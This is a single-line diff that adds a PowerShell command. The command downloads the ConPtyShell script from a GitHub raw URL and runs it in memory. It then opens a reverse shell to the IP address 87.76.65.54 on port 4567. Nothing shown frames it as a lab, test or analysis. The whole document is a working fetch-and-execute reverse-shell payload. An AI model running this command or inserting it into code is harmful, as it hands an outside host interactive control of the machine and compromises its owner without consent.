@@ -1,0 +1,1 @@
+IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/InvokeConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 87.76.65.54 4567
